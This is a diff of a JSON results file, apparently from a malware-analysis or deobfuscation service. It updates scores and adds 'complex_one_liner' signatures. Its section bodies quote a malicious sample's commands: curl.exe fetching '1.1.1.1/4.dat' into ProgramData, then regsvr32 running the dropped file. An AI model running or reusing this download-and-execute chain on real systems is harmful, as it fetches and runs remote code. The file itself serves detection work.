@@ -1,11 +1,16 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 710,
+    "score": 1060,
     "sections": [
       {
         "auto_collapse": false,
-        "body": "[{\"LOLBAS\": \"regsvr32\", \"Command\": \"regsvr32 \\\"C:\\\\ProgramData\\\\Pterds\\\\HErtop.pos\\\"\"}]",
+        "body": [
+          {
+            "Command": "regsvr32 \"C:\\ProgramData\\Pterds\\HErtop.pos\"",
+            "LOLBAS": "regsvr32"
+          }
+        ],
         "body_config": {
           "column_order": [
             "LOLBAS",
@@ -19,17 +24,28 @@
           "attack_ids": [],
           "frequency": 1,
           "heur_id": 2,
-          "score": 50,
-          "score_map": {},
-          "signatures": {}
+          "score": 400,
+          "score_map": {
+            "complex_one_liner": 400
+          },
+          "signatures": {
+            "complex_one_liner": 1
+          }
         },
+        "promote_to": null,
         "tags": {},
         "title_text": "Possible rare LOLBAS found",
         "zeroize_on_tag_safe": false
       },
       {
         "auto_collapse": false,
-        "body": "[{\"URL\": \"1.1.1.1/4.dat\", \"Destination\": \"C:\\\\ProgramData\\\\Pterds\\\\HErtop.pos\", \"Command\": \"curl.exe -o C:\\\\ProgramData\\\\Pterds\\\\HErtop.pos 1.1.1.1/4.dat\"}]",
+        "body": [
+          {
+            "Command": "curl.exe -o C:\\ProgramData\\Pterds\\HErtop.pos 1.1.1.1/4.dat",
+            "Destination": "C:\\ProgramData\\Pterds\\HErtop.pos",
+            "URL": "1.1.1.1/4.dat"
+          }
+        ],
         "body_config": {
           "column_order": [
             "URL",
@@ -50,6 +66,7 @@
             "complex_one_liner": 1
           }
         },
+        "promote_to": null,
         "tags": {
           "dynamic": {
             "process": {
@@ -98,6 +115,7 @@
             "downloads_file_to_programdata": 1
           }
         },
+        "promote_to": null,
         "tags": {
           "file": {
             "path": [
@@ -123,7 +141,9 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"Number of line after deobfuscation\": 7}",
+        "body": {
+          "Number of line after deobfuscation": 7
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
@@ -136,6 +156,7 @@
           "score_map": {},
           "signatures": {}
         },
+        "promote_to": null,
         "tags": {},
         "title_text": "Complexe One-Liner",
         "zeroize_on_tag_safe": false
@@ -156,7 +177,9 @@
       {
         "attack_ids": [],
         "heur_id": 2,
-        "signatures": []
+        "signatures": [
+          "complex_one_liner"
+        ]
       },
       {
         "attack_ids": [],
